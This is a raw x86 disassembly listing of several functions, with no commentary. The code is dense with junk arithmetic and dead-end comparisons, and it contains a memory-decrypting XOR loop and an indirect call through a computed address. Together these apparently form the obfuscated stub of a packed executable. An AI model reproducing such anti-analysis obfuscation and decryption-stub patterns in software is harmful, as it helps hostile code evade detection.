  406cbd:	cmp    esi,DWORD PTR [ebp-0x1c]
  406cc0:	je     0x406cd4
  406cc2:	sub    DWORD PTR [ebp-0x28],ecx
  406cc5:	mov    edx,DWORD PTR [ebp-0x28]
  406cc8:	add    DWORD PTR [ebp-0x28],esi
  406ccb:	sub    DWORD PTR [ebp-0x28],eax
  406cce:	sub    DWORD PTR [ebp-0x28],edi
  406cd1:	and    DWORD PTR [ebp-0x28],edx
  406cd4:	pop    edi
  406cd5:	or     esi,ebx
  406cd7:	test   esi,0xc9
  406cdd:	je     0x406db2
  406ce3:	or     esi,edi
  406ce5:	mov    ebx,0xa8c2
  406cea:	add    esi,ebx
  406cec:	add    esi,edi
  406cee:	mov    ebx,DWORD PTR [ebp-0x28]
  406cf1:	cmp    ebx,DWORD PTR [ebp-0xc]
  406cf4:	je     0x406db2
  406cfa:	xor    edx,edx
  406cfc:	mov    DWORD PTR [ebp-0x28],edx
  406cff:	mov    edx,edi
  406d01:	add    edx,eax
  406d03:	add    DWORD PTR [ebp-0x28],edx
  406d06:	cmp    ebx,edx
  406d08:	jne    0x406db2
  406d0e:	cmp    esi,DWORD PTR [ebp-0xc]
  406d11:	je     0x406db2
  406d17:	add    DWORD PTR [ebp-0x28],esi
  406d1a:	mov    ecx,0xbf
  406d1f:	sub    ebx,ecx
  406d21:	cmp    ebx,0x7d45
  406d27:	je     0x406db2
  406d2d:	sub    ebx,ecx
  406d2f:	mov    ecx,DWORD PTR [ebp-0x28]
  406d32:	or     ebx,edx
  406d34:	sub    ebx,edx
  406d36:	mov    esi,DWORD PTR [ebp-0x28]
  406d39:	add    DWORD PTR [ebp-0x28],ebx
  406d3c:	add    DWORD PTR [ebp-0x28],ebx
  406d3f:	add    ecx,edi
  406d41:	add    ecx,ebx
  406d43:	cmp    esi,0x956c
  406d49:	jne    0x406db2
  406d4b:	cmp    esi,0x7d
  406d4e:	jne    0x406db2
  406d50:	add    esi,edx
  406d52:	cmp    esi,0x68
  406d55:	jne    0x406db2
  406d57:	sub    esi,ebx
  406d59:	mov    edx,DWORD PTR [ebp-0x28]
  406d5c:	or     esi,edx
  406d5e:	mov    ebx,eax
  406d60:	test   edx,0xef
  406d66:	je     0x406db2
  406d68:	sub    DWORD PTR [ebp-0x28],ecx
  406d6b:	mov    ecx,DWORD PTR [ebp-0x28]
  406d6e:	and    DWORD PTR [ebp-0x28],esi
  406d71:	add    DWORD PTR [ebp-0x28],ecx
  406d74:	add    ebx,eax
  406d76:	mov    ecx,DWORD PTR [ebp-0x28]
  406d79:	add    ecx,ecx
  406d7b:	cmp    ecx,0xc143
  406d81:	je     0x406db2
  406d83:	mov    edx,DWORD PTR [ebp-0x28]
  406d86:	sub    edx,edi
  406d88:	sub    edx,eax
  406d8a:	sub    DWORD PTR [ebp-0x28],edx
  406d8d:	add    DWORD PTR [ebp-0x28],ecx
  406d90:	mov    DWORD PTR [ebp-0x28],ecx
  406d93:	sub    ebx,edi
  406d95:	add    ebx,edx
  406d97:	cmp    ebx,edx
  406d99:	je     0x406db2
  406d9b:	add    ebx,edi
  406d9d:	add    ebx,ebx
  406d9f:	mov    esi,0x64
  406da4:	xor    DWORD PTR [ebp-0x28],ebx
  406da7:	mov    edx,0x97
  406dac:	add    DWORD PTR [ebp-0x28],esi
  406daf:	mov    DWORD PTR [ebp-0x28],edx
  406db2:	pop    esi
  406db3:	cmp    esi,0x1
  406db6:	je     0x406ed8
  406dbc:	mov    ecx,DWORD PTR [ebp-0x28]
  406dbf:	sub    DWORD PTR [ebp-0x28],esi
  406dc2:	add    ecx,eax
  406dc4:	add    ecx,esi
  406dc6:	sub    ecx,esi
  406dc8:	mov    edx,0xc8
  406dcd:	test   ecx,0x71
  406dd3:	je     0x406ed8
  406dd9:	add    DWORD PTR [ebp-0x28],edx
  406ddc:	mov    ebx,DWORD PTR [ebp-0x28]
  406ddf:	mov    edx,DWORD PTR [ebp-0x28]
  406de2:	cmp    esi,DWORD PTR [ebp-0x8]
  406de5:	je     0x406ed8
  406deb:	cmp    ecx,DWORD PTR [ebp-0x4]
  406dee:	je     0x406ed8
  406df4:	sub    DWORD PTR [ebp-0x28],edx
  406df7:	cmp    ecx,edi
  406df9:	jne    0x406ed8
  406dff:	add    ebx,edi
  406e01:	test   ebx,0xb6d3
  406e07:	je     0x406ed8
  406e0d:	test   ecx,0x2d
  406e13:	je     0x406ed8
  406e19:	mov    edx,esi
  406e1b:	add    ecx,edx
  406e1d:	sub    ecx,ebx
  406e1f:	test   ecx,0x6
  406e25:	jne    0x406ed8
  406e2b:	mov    ebx,edx
  406e2d:	and    ebx,eax
  406e2f:	cmp    ebx,DWORD PTR [ebp-0x18]
  406e32:	je     0x406ed8
  406e38:	sub    ecx,edi
  406e3a:	add    DWORD PTR [ebp-0x28],edx
  406e3d:	add    DWORD PTR [ebp-0x28],edi
  406e40:	mov    edx,DWORD PTR [ebp-0x28]
  406e43:	add    DWORD PTR [ebp-0x28],ecx
  406e46:	sub    edx,ecx
  406e48:	mov    ecx,DWORD PTR [ebp-0x28]
  406e4b:	sub    ecx,edi
  406e4d:	sub    DWORD PTR [ebp-0x28],ebx
  406e50:	and    ecx,eax
  406e52:	sub    ecx,edx
  406e54:	cmp    ecx,0x7
  406e57:	jne    0x406ed8
  406e59:	mov    edx,DWORD PTR [ebp-0x28]
  406e5c:	add    DWORD PTR [ebp-0x28],edx
  406e5f:	sub    DWORD PTR [ebp-0x28],ebx
  406e62:	cmp    ecx,0x83024041
  406e68:	jne    0x406ed8
  406e6a:	and    ecx,eax
  406e6c:	mov    ebx,edi
  406e6e:	add    DWORD PTR [ebp-0x28],ebx
  406e71:	test   ecx,0x1908a00a
  406e77:	jne    0x406ed8
  406e79:	mov    edx,DWORD PTR [ebp-0x28]
  406e7c:	add    edx,eax
  406e7e:	sub    DWORD PTR [ebp-0x28],ecx
  406e81:	mov    ecx,DWORD PTR [ebp-0x28]
  406e84:	cmp    edx,0x2ccb
  406e8a:	jne    0x406ed8
  406e8c:	mov    ebx,edi
  406e8e:	add    edx,edi
  406e90:	add    ecx,edx
  406e92:	mov    edx,DWORD PTR [ebp-0x28]
  406e95:	sub    DWORD PTR [ebp-0x28],ebx
  406e98:	cmp    edx,DWORD PTR [ebp-0x28]
  406e9b:	jne    0x406ed8
  406e9d:	mov    ebx,0xfd
  406ea2:	sub    DWORD PTR [ebp-0x28],ebx
  406ea5:	add    DWORD PTR [ebp-0x28],edx
  406ea8:	sub    DWORD PTR [ebp-0x28],esi
  406eab:	mov    edx,0x3b5e
  406eb0:	cmp    ecx,0xffffffd8
  406eb3:	je     0x406ed8
  406eb5:	mov    ebx,DWORD PTR [ebp-0x28]
  406eb8:	sub    DWORD PTR [ebp-0x28],ecx
  406ebb:	xor    ecx,ecx
  406ebd:	and    edx,ebx
  406ebf:	or     DWORD PTR [ebp-0x28],edx
  406ec2:	cmp    ebx,0xb842
  406ec8:	je     0x406ed8
  406eca:	cmp    esi,0xffffffb8
  406ecd:	jne    0x406ed8
  406ecf:	add    ecx,edx
  406ed1:	xor    ebx,ebx
  406ed3:	sub    ecx,ebx
  406ed5:	sub    DWORD PTR [ebp-0x28],ecx
  406ed8:	pop    ebx
  406ed9:	cmp    ecx,ebx
  406edb:	je     0x406f09
  406edd:	cmp    ecx,0xffffffdc
  406ee0:	je     0x406f09
  406ee2:	mov    ecx,DWORD PTR [ebp-0x28]
  406ee5:	sub    DWORD PTR [ebp-0x28],ebx
  406ee8:	xor    edx,edx
  406eea:	and    ecx,esi
  406eec:	sub    DWORD PTR [ebp-0x28],edx
  406eef:	add    ecx,esi
  406ef1:	sub    ecx,edx
  406ef3:	add    ecx,esi
  406ef5:	sub    DWORD PTR [ebp-0x28],edx
  406ef8:	cmp    ecx,ebx
  406efa:	jne    0x406f09
  406efc:	add    ecx,esi
  406efe:	cmp    ecx,0x60c4414
  406f04:	je     0x406f09
  406f06:	sub    DWORD PTR [ebp-0x28],ecx
  406f09:	leave  
  406f0a:	ret    
  406f0b:	int3   
  406f0c:	int3   
  406f0d:	int3   
  406f0e:	int3   
  406f0f:	int3   
  406f10:	push   ebp
  406f11:	mov    ebp,esp
  406f13:	sub    esp,0x3c
  406f16:	mov    edx,0x5e
  406f1b:	mov    DWORD PTR [ebp-0x20],edx
  406f1e:	call   0x408783
  406f23:	push   ebx
  406f24:	push   0x36135e00
  406f29:	push   0xffffffe6
  406f2b:	push   0xae744700
  406f30:	push   0xffffff96
  406f32:	call   0x407edf
  406f37:	add    esp,0x10
  406f3a:	push   0xffffffa3
  406f3c:	push   0x2a862000
  406f41:	push   0x66
  406f43:	push   0xffffffc3
  406f45:	push   0x761ac400
  406f4a:	call   0x408197
  406f4f:	add    esp,0x14
  406f52:	push   esi
  406f53:	cmp    eax,DWORD PTR [ebp-0x18]
  406f56:	je     0x406f6d
  406f58:	push   0xffffff84
  406f5a:	push   0xb61b2a00
  406f5f:	push   0x6f
  406f61:	push   0x2b
  406f63:	push   0xffffff80
  406f65:	call   0x408949
  406f6a:	add    esp,0x14
  406f6d:	push   0x8e61db00
  406f72:	push   0xffffffcb
  406f74:	call   0x408949
  406f79:	add    esp,0x8
  406f7c:	push   edi
  406f7d:	push   0xffffff9d
  406f7f:	call   0x408783
  406f84:	add    esp,0x4
  406f87:	push   0x6c5a0a00
  406f8c:	call   0x407d25
  406f91:	add    esp,0x4
  406f94:	mov    edx,DWORD PTR [ebp+0x10]
  406f97:	mov    esi,eax
  406f99:	cmp    esi,DWORD PTR [ebp-0x18]
  406f9c:	jne    0x406fb7
  406f9e:	cmp    esi,0xffffff86
  406fa1:	jne    0x406fb7
  406fa3:	sub    esi,eax
  406fa5:	mov    eax,esi
  406fa7:	test   edx,0xe1
  406fad:	je     0x406fb7
  406faf:	cmp    eax,DWORD PTR [ebp-0x28]
  406fb2:	jne    0x406fb7
  406fb4:	mov    DWORD PTR [ebp-0x20],eax
  406fb7:	mov    eax,DWORD PTR [ebp+0x8]
  406fba:	add    esi,esi
  406fbc:	mov    edi,DWORD PTR [ebp-0x20]
  406fbf:	add    esi,esi
  406fc1:	sub    edi,edx
  406fc3:	mov    ecx,0x50
  406fc8:	add    DWORD PTR [ebp-0x20],esi
  406fcb:	test   eax,0xd040
  406fd0:	jne    0x4070d8
  406fd6:	and    ecx,esi
  406fd8:	mov    esi,0x50bd
  406fdd:	xor    ebx,ebx
  406fdf:	add    DWORD PTR [ebp-0x20],ebx
  406fe2:	and    esi,edi
  406fe4:	cmp    ecx,0xffffffec
  406fe7:	jne    0x4070d8
  406fed:	mov    ebx,DWORD PTR [ebp-0x20]
  406ff0:	test   ebx,0xdfc8
  406ff6:	jne    0x4070d8
  406ffc:	mov    edi,eax
  406ffe:	sub    DWORD PTR [ebp-0x20],ecx
  407001:	test   ebx,0xa9
  407007:	je     0x4070d8
  40700d:	or     esi,eax
  40700f:	mov    ecx,0x44
  407014:	or     edi,edx
  407016:	cmp    ebx,0x8ff7
  40701c:	je     0x4070d8
  407022:	add    edi,eax
  407024:	add    DWORD PTR [ebp-0x20],edi
  407027:	test   esi,0xdb
  40702d:	jne    0x4070d8
  407033:	mov    edi,DWORD PTR [ebp-0x20]
  407036:	sub    edi,eax
  407038:	cmp    esi,0x7a23
  40703e:	je     0x4070d8
  407044:	mov    ecx,0x51
  407049:	mov    DWORD PTR [ebp-0x20],esi
  40704c:	and    DWORD PTR [ebp-0x20],ebx
  40704f:	and    edi,esi
  407051:	add    DWORD PTR [ebp-0x20],edi
  407054:	sub    ecx,edi
  407056:	sub    ecx,edx
  407058:	sub    DWORD PTR [ebp-0x20],edi
  40705b:	cmp    ecx,ebx
  40705d:	jne    0x4070d8
  40705f:	mov    esi,0x4eb0
  407064:	sub    ecx,edi
  407066:	cmp    ecx,0x59
  407069:	je     0x4070d8
  40706b:	add    ecx,ebx
  40706d:	add    ecx,eax
  40706f:	sub    esi,edi
  407071:	mov    edi,0xaf
  407076:	mov    ebx,DWORD PTR ds:0x4373c4
  40707c:	test   ecx,0xc4
  407082:	je     0x4070d8
  407084:	sub    DWORD PTR [ebp-0x20],esi
  407087:	and    ebx,edx
  407089:	sub    ecx,edi
  40708b:	cmp    ecx,0x2
  40708e:	jne    0x4070d8
  407090:	cmp    ecx,0x22
  407093:	je     0x4070d8
  407095:	sub    ebx,ecx
  407097:	cmp    ebx,DWORD PTR ds:0x4373c4
  40709d:	jne    0x4070d8
  40709f:	mov    esi,DWORD PTR ds:0x4373c4
  4070a5:	sub    esi,edx
  4070a7:	add    DWORD PTR [ebp-0x20],ecx
  4070aa:	mov    ecx,DWORD PTR [ebp-0x20]
  4070ad:	cmp    esi,0xffffffae
  4070b0:	jne    0x4070d8
  4070b2:	cmp    ebx,ecx
  4070b4:	je     0x4070d8
  4070b6:	cmp    esi,0x2
  4070b9:	je     0x4070d8
  4070bb:	and    esi,edi
  4070bd:	mov    edi,DWORD PTR [ebp-0x20]
  4070c0:	and    ecx,edx
  4070c2:	sub    esi,edx
  4070c4:	add    esi,ebx
  4070c6:	add    DWORD PTR [ebp-0x20],ecx
  4070c9:	xor    DWORD PTR [ebp-0x20],ecx
  4070cc:	or     esi,edx
  4070ce:	sub    edi,esi
  4070d0:	cmp    edi,DWORD PTR [ebp-0x14]
  4070d3:	je     0x4070d8
  4070d5:	add    DWORD PTR [ebp-0x20],edi
  4070d8:	cmp    DWORD PTR [ebp+0xc],edx
  4070db:	je     0x40719f
  4070e1:	mov    ecx,edx
  4070e3:	mov    ebx,DWORD PTR [ebp-0x20]
  4070e6:	or     DWORD PTR [ebp-0x20],ecx
  4070e9:	add    ebx,ecx
  4070eb:	and    ebx,esi
  4070ed:	add    DWORD PTR [ebp-0x20],ebx
  4070f0:	dec    DWORD PTR [ebp+0xc]
  4070f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4070f6:	mov    ebx,0xb2
  4070fb:	sub    ecx,eax
  4070fd:	add    ecx,esi
  4070ff:	sub    DWORD PTR [ebp-0x20],esi
  407102:	or     ecx,eax
  407104:	sub    ecx,eax
  407106:	mov    DWORD PTR [ebp-0x20],edi
  407109:	cmp    ecx,0xfffffffe
  40710c:	je     0x40712d
  40710e:	mov    edi,DWORD PTR [ebp-0x20]
  407111:	sub    edi,edx
  407113:	add    DWORD PTR [ebp-0x20],ecx
  407116:	mov    ebx,0x90cb
  40711b:	or     DWORD PTR [ebp-0x20],esi
  40711e:	sub    ebx,edi
  407120:	cmp    ebx,edx
  407122:	jne    0x40712d
  407124:	mov    ecx,DWORD PTR [ebp-0x20]
  407127:	sub    DWORD PTR [ebp-0x20],ecx
  40712a:	add    DWORD PTR [ebp-0x20],ebx
  40712d:	xor    DWORD PTR [eax],edx
  40712f:	add    DWORD PTR [ebp-0x20],ebx
  407132:	add    DWORD PTR [eax],0xbd1542ba
  407138:	mov    DWORD PTR [ebp-0x20],esi
  40713b:	xor    DWORD PTR [eax],0xaf5cea79
  407141:	sub    edi,ecx
  407143:	mov    ebx,DWORD PTR [ebp-0x20]
  407146:	mov    ecx,DWORD PTR [ebp-0x20]
  407149:	sub    edi,esi
  40714b:	cmp    edi,0xffffffc1
  40714e:	jne    0x40715b
  407150:	add    DWORD PTR [ebp-0x20],ecx
  407153:	add    ebx,ebx
  407155:	sub    DWORD PTR [ebp-0x20],ebx
  407158:	add    DWORD PTR [ebp-0x20],edi
  40715b:	add    eax,0x4
  40715e:	mov    edi,DWORD PTR [ebp-0x20]
  407161:	test   eax,0x7f
  407166:	jne    0x40719a
  407168:	xor    ebx,ebx
  40716a:	xor    ecx,ecx
  40716c:	add    ecx,edx
  40716e:	sub    ebx,eax
  407170:	cmp    ebx,0xffffff8b
  407173:	je     0x40719a
  407175:	add    DWORD PTR [ebp-0x20],edi
  407178:	mov    edi,0x3a
  40717d:	and    ecx,eax
  40717f:	cmp    esi,0x37
  407182:	je     0x40719a
  407184:	mov    DWORD PTR [ebp-0x20],edi
  407187:	sub    DWORD PTR [ebp-0x20],ecx
  40718a:	add    ebx,ebx
  40718c:	mov    ecx,0xfa
  407191:	sub    ebx,edx
  407193:	or     ebx,edx
  407195:	add    ecx,ebx
  407197:	add    DWORD PTR [ebp-0x20],ecx
  40719a:	jmp    0x406fba
  40719f:	sub    ecx,edx
  4071a1:	push   0xffffffc3
  4071a3:	push   0x4aa05f00
  4071a8:	call   0x408624
  4071ad:	add    esp,0x8
  4071b0:	call   0x407d25
  4071b5:	push   0x11
  4071b7:	call   0x407fe2
  4071bc:	add    esp,0x4
  4071bf:	push   0xffffffd4
  4071c1:	push   0xffffffc4
  4071c3:	push   0xcc134e00
  4071c8:	call   0x407edf
  4071cd:	add    esp,0xc
  4071d0:	mov    edx,0x92
  4071d5:	add    DWORD PTR [ebp-0x20],edx
  4071d8:	push   0xffffffb3
  4071da:	push   0xfffffff6
  4071dc:	push   0xba8ab000
  4071e1:	call   0x408949
  4071e6:	add    esp,0xc
  4071e9:	pop    edi
  4071ea:	call   0x407edf
  4071ef:	push   0xffffff88
  4071f1:	call   0x408515
  4071f6:	add    esp,0x4
  4071f9:	pop    esi
  4071fa:	xor    ecx,ecx
  4071fc:	sub    DWORD PTR [ebp-0x20],edi
  4071ff:	or     DWORD PTR [ebp-0x20],esi
  407202:	sub    ecx,esi
  407204:	push   0x69
  407206:	push   0x6c139800
  40720b:	push   0x9c5d5600
  407210:	push   0xffffffca
  407212:	call   0x408197
  407217:	add    esp,0x10
  40721a:	pop    ebx
  40721b:	add    eax,esi
  40721d:	cmp    ebx,eax
  40721f:	je     0x407233
  407221:	cmp    eax,esi
  407223:	je     0x407233
  407225:	cmp    eax,0xdc6f
  40722a:	jne    0x407233
  40722c:	and    eax,edi
  40722e:	call   0x407fe2
  407233:	leave  
  407234:	ret    0xc
  407237:	int3   
  407238:	int3   
  407239:	int3   
  40723a:	int3   
  40723b:	int3   
  40723c:	push   ebp
  40723d:	mov    ebp,esp
  40723f:	sub    esp,0x28
  407242:	push   0xffffffc7
  407244:	push   0x5e80b500
  407249:	push   0x46ac2a00
  40724e:	push   0x26
  407250:	call   0x407edf
  407255:	add    esp,0x10
  407258:	push   ebx
  407259:	push   0x768b0c00
  40725e:	push   0x2c0eb200
  407263:	push   0x22d04c00
  407268:	call   0x407fe2
  40726d:	add    esp,0xc
  407270:	push   esi
  407271:	push   0xbeae3300
  407276:	push   0x5c256c00
  40727b:	push   0x3c19c000
  407280:	push   0xebcd600
  407285:	call   0x407ba2
  40728a:	add    esp,0x10
  40728d:	push   edi
  40728e:	push   0x5e94fb00
  407293:	push   0x1ada0900
  407298:	push   0xffffffb4
  40729a:	push   0xffffffad
  40729c:	call   0x408515
  4072a1:	add    esp,0x10
  4072a4:	push   0x22
  4072a6:	push   0x9c543100
  4072ab:	push   0xfae1bd00
  4072b0:	push   0xeeddfe00
  4072b5:	push   0x1f
  4072b7:	call   0x408624
  4072bc:	add    esp,0x14
  4072bf:	mov    ebx,eax
  4072c1:	push   0x47
  4072c3:	push   0xffffffe3
  4072c5:	push   0x1ade7b00
  4072ca:	call   0x408624
  4072cf:	add    esp,0xc
  4072d2:	push   0x4c0d5f00
  4072d7:	push   0xd2a88a00
  4072dc:	push   0xffffff87
  4072de:	push   0xc
  4072e0:	call   0x408197
  4072e5:	add    esp,0x10
  4072e8:	push   0xffffffbe
  4072ea:	push   0xb634a500
  4072ef:	call   0x407fe2
  4072f4:	add    esp,0x8
  4072f7:	push   0x54
  4072f9:	push   0xfffffff5
  4072fb:	call   0x408624
  407300:	add    esp,0x8
  407303:	mov    edx,0x87
  407308:	push   0xf6eae300
  40730d:	push   0xe6c82200
  407312:	push   0xcc2cba00
  407317:	push   0x51
  407319:	push   0xffffffe2
  40731b:	call   0x408515
  407320:	add    esp,0x14
  407323:	push   0x2d05000
  407328:	push   0xc52be00
  40732d:	call   0x408197
  407332:	add    esp,0x8
  407335:	push   0x869f0f00
  40733a:	call   0x407fe2
  40733f:	add    esp,0x4
  407342:	push   0x76f55300
  407347:	push   0x4c3adc00
  40734c:	push   0xaa926d00
  407351:	push   0xffffffcb
  407353:	push   0x1b
  407355:	call   0x408949
  40735a:	add    esp,0x14
  40735d:	push   0xec6c6700
  407362:	push   0x0
  407364:	push   0xc4eb800
  407369:	push   0x46
  40736b:	push   0xae0b6300
  407370:	call   0x407edf
  407375:	add    esp,0x14
  407378:	mov    DWORD PTR [ebp-0x1c],ebx
  40737b:	mov    edi,0x876c5f28
  407380:	push   0xffffff88
  407382:	push   0x54
  407384:	push   0xaaaab600
  407389:	push   0xae674500
  40738e:	push   0x12b78400
  407393:	call   0x407d25
  407398:	add    esp,0x14
  40739b:	sub    edi,0x876c5ee8
  4073a1:	sub    eax,ebx
  4073a3:	push   0x2c7def00
  4073a8:	push   0x5c39fe00
  4073ad:	push   0x23
  4073af:	call   0x407ba2
  4073b4:	add    esp,0xc
  4073b7:	push   edi
  4073b8:	sub    ebx,eax
  4073ba:	push   0x6edd4900
  4073bf:	push   0xf68c0500
  4073c4:	push   0x12d55800
  4073c9:	push   0xffffffa4
  4073cb:	call   0x407edf
  4073d0:	add    esp,0x10
  4073d3:	push   0xfffffff9
  4073d5:	push   0xffffffc0
  4073d7:	push   0x7c359900
  4073dc:	push   0x7c4f2900
  4073e1:	push   0x16
  4073e3:	call   0x407edf
  4073e8:	add    esp,0x14
  4073eb:	or     DWORD PTR [ebp-0x1c],ebx
  4073ee:	push   0x6c6b8700
  4073f3:	push   0xc6806e00
  4073f8:	call   0x407fe2
  4073fd:	add    esp,0x8
  407400:	mov    esi,0xfe6f0ae
  407405:	push   0x16
  407407:	call   0x408783
  40740c:	add    esp,0x4
  40740f:	push   0xffffffe4
  407411:	call   0x4082a5
  407416:	add    esp,0x4
  407419:	add    esi,0xf0191f52
  40741f:	call   0x407ba2
  407424:	push   esi
  407425:	sub    DWORD PTR [ebp-0x1c],ebx
  407428:	call   0x407ba2
  40742d:	push   0x5f52d
  407432:	mov    edx,0xc4
  407437:	add    edx,edx
  407439:	push   0x8ee74200
  40743e:	push   0xffffff82
  407440:	push   0xffffffe5
  407442:	call   0x408624
  407447:	add    esp,0xc
  40744a:	push   0x0
  40744c:	add    edi,edi
  40744e:	mov    edx,DWORD PTR [ebp-0x1c]
  407451:	mov    ebx,DWORD PTR ds:0x4373c8
  407457:	push   0x3640ed00
  40745c:	push   0xe1a2500
  407461:	call   0x407d25
  407466:	add    esp,0x8
  407469:	push   0xffffff8f
  40746b:	push   0x32bb0100
  407470:	push   0x7e
  407472:	call   0x407fe2
  407477:	add    esp,0xc
  40747a:	push   0x6a
  40747c:	push   0x1d
  40747e:	call   0x407d25
  407483:	add    esp,0x8
  407486:	call   0x408783
  40748b:	push   0x22
  40748d:	push   0x8e1b6000
  407492:	push   0xffffffc0
  407494:	call   0x408783
  407499:	add    esp,0xc
  40749c:	push   0xe4ba700
  4074a1:	push   0x74
  4074a3:	push   0xffffffcc
  4074a5:	call   0x407edf
  4074aa:	add    esp,0xc
  4074ad:	call   0x408624
  4074b2:	push   0xaea0bf00
  4074b7:	push   0x1f
  4074b9:	call   0x408515
  4074be:	add    esp,0x8
  4074c1:	push   0x22
  4074c3:	push   0xae68f200
  4074c8:	push   0x9c6a0200
  4074cd:	call   0x408783
  4074d2:	add    esp,0xc
  4074d5:	push   0x73
  4074d7:	push   0xc75bb00
  4074dc:	push   0x36046b00
  4074e1:	push   0xffffffa1
  4074e3:	call   0x408197
  4074e8:	add    esp,0x10
  4074eb:	call   0x408515
  4074f0:	push   0x5c30dd00
  4074f5:	push   0xe4a3d00
  4074fa:	push   0x96b51500
  4074ff:	push   0x43
  407501:	call   0x408197
  407506:	add    esp,0x10
  407509:	sub    DWORD PTR [ebp-0x1c],ebx
  40750c:	push   0xffffffd5
  40750e:	push   0xffffffc5
  407510:	push   0xa2a73c00
  407515:	push   0x36599a00
  40751a:	call   0x408624
  40751f:	add    esp,0x10
  407522:	push   0x16f7c100
  407527:	push   0x6c052500
  40752c:	call   0x407fe2
  407531:	add    esp,0x8
  407534:	push   0xae713400
  407539:	push   0x17
  40753b:	push   0xac3afd00
  407540:	push   0xe
  407542:	push   0xae421800
  407547:	call   0x408197
  40754c:	add    esp,0x14
  40754f:	push   0xffffffde
  407551:	push   0x18
  407553:	push   0x1c10d500
  407558:	push   0xe24d000
  40755d:	push   0xe
  40755f:	call   0x407edf
  407564:	add    esp,0x14
  407567:	push   0xfe9aef00
  40756c:	push   0x35
  40756e:	push   0xffffffaf
  407570:	push   0xffffffd6
  407572:	call   0x408515
  407577:	add    esp,0x10
  40757a:	call   0x407edf
  40757f:	push   0xaaff9300
  407584:	push   0x36751800
  407589:	call   0x407ba2
  40758e:	add    esp,0x8
  407591:	push   0xffffffa2
  407593:	push   0x3c167e00
  407598:	push   0xffffffd8
  40759a:	push   0x36
  40759c:	push   0x68
  40759e:	call   0x408197
  4075a3:	add    esp,0x14
  4075a6:	push   0xe258d00
  4075ab:	push   0xfffffff8
  4075ad:	push   0x469d3600
  4075b2:	push   0x3
  4075b4:	call   0x407d25
  4075b9:	add    esp,0x10
  4075bc:	push   0x5
  4075be:	push   0xfc546400
  4075c3:	call   0x407d25
  4075c8:	add    esp,0x8
  4075cb:	push   0xfabdcc00
  4075d0:	push   0x7b
  4075d2:	push   0xfffffff1
  4075d4:	push   0x763eda00
  4075d9:	push   0x3d
  4075db:	call   0x408515
  4075e0:	add    esp,0x14
  4075e3:	push   0xffffffa6
  4075e5:	push   0x1e
  4075e7:	push   0xfffffffd
  4075e9:	push   0xffffff85
  4075eb:	push   0xaed8b800
  4075f0:	call   0x408197
  4075f5:	add    esp,0x14
  4075f8:	push   0x32c4a100
  4075fd:	push   0xb66bd100
  407602:	push   0x5ed75b00
  407607:	push   0x35
  407609:	push   0xffffffbc
  40760b:	call   0x408783
  407610:	add    esp,0x14
  407613:	call   0x407ba2
  407618:	sub    DWORD PTR [ebp-0x1c],edi
  40761b:	push   0x52
  40761d:	push   0x3662ab00
  407622:	push   0x22c90e00
  407627:	push   0x5c672b00
  40762c:	call   0x407fe2
  407631:	add    esp,0x10
  407634:	mov    ebx,0xfd94236
  407639:	push   0xffffffb2
  40763b:	push   0xf62ec800
  407640:	push   0x25
  407642:	push   0xffffffc3
  407644:	call   0x408624
  407649:	add    esp,0x10
  40764c:	push   0xffffffa6
  40764e:	push   0x31
  407650:	push   0xac454400
  407655:	call   0x408515
  40765a:	add    esp,0xc
  40765d:	sub    ebx,0xf95d0f2
  407663:	push   0x3a8acd00
  407668:	push   0xa914900
  40766d:	call   0x407edf
  407672:	add    esp,0x8
  407675:	call   DWORD PTR [ebx]
  407677:	and    ebx,esi
  407679:	sub    ebx,edi
  40767b:	or     ebx,esi
  40767d:	and    ebx,eax
  40767f:	mov    ecx,DWORD PTR [ebp-0x1c]
  407682:	cmp    ebx,DWORD PTR [ebp-0x18]
  407685:	jne    0x4076a7
  407687:	add    ecx,ecx
  407689:	cmp    ecx,DWORD PTR ds:0x4373c8
  40768f:	je     0x4076a7
  407691:	and    DWORD PTR [ebp-0x1c],ebx
  407694:	cmp    ecx,DWORD PTR ds:0x4373c8
  40769a:	jne    0x4076a7
  40769c:	cmp    ecx,0xe370
  4076a2:	je     0x4076a7
  4076a4:	mov    DWORD PTR [ebp-0x1c],ecx
  4076a7:	mov    DWORD PTR [ebp-0x10],eax
  4076aa:	push   0xffffff94
  4076ac:	push   0xb672cd00
  4076b1:	push   0x9c40f700
  4076b6:	call   0x408197
  4076bb:	add    esp,0xc
  4076be:	push   0xffffffbb
  4076c0:	push   0x55
  4076c2:	push   0x8e23b900
  4076c7:	push   0xfffffff2
  4076c9:	push   0xe2a5f200
  4076ce:	call   0x407d25
  4076d3:	add    esp,0x14
  4076d6:	mov    ebx,0xeda8af7a
  4076db:	mov    esi,DWORD PTR [ebp-0x1c]
  4076de:	add    esi,esi
  4076e0:	mov    edx,DWORD PTR [ebp-0x1c]
  4076e3:	push   0xffffffdd
  4076e5:	push   0x6e
  4076e7:	push   0xffffffb9
  4076e9:	push   0xffffff8f
  4076eb:	call   0x408624
  4076f0:	add    esp,0x10
  4076f3:	push   0x6
  4076f5:	push   0xfffffff3
  4076f7:	push   0xcab0d300
  4076fc:	call   0x407edf
  407701:	add    esp,0xc
  407704:	or     DWORD PTR [ebp-0x1c],esi
  407707:	push   0xdc11a600
  40770c:	push   0xe9f8f00
  407711:	push   0x6f
  407713:	push   0xae764800
  407718:	push   0xb2e04600
  40771d:	call   0x408197
  407722:	add    esp,0x14
  407725:	add    ebx,0x129ac086
  40772b:	push   0xffffffc3
  40772d:	push   0xffffff9b
  40772f:	push   0xffffff92
  407731:	call   0x408197
  407736:	add    esp,0xc
  407739:	call   0x4082a5
  40773e:	mov    DWORD PTR [ebp-0x24],ebx
  407741:	sub    edi,ebx
  407743:	push   0x7634c600
  407748:	push   0x8e1af600
  40774d:	push   0xe7ff700
  407752:	push   0xc2ea5b00
  407757:	call   0x407edf
  40775c:	add    esp,0x10
  40775f:	push   0x1e
  407761:	push   0x3a99b700
  407766:	push   0xbc2b1500
  40776b:	push   0x5f
  40776d:	push   0x52
  40776f:	call   0x4082a5
  407774:	add    esp,0x14
  407777:	xor    esi,esi
  407779:	mov    ecx,DWORD PTR ds:0x4373c8
  40777f:	push   0xfc7dde00
  407784:	push   0x6e
  407786:	push   0xae77ea00
  40778b:	call   0x407d25
  407790:	add    esp,0xc
  407793:	push   0x3a8b7700
  407798:	push   0xfc32e100
  40779d:	call   0x408624
  4077a2:	add    esp,0x8
  4077a5:	push   0xb2fcf600
  4077aa:	push   0xffffffb0
  4077ac:	call   0x408783
  4077b1:	add    esp,0x8
  4077b4:	push   0xfffffff3
  4077b6:	push   0x4c47e400
  4077bb:	push   0x6c657000
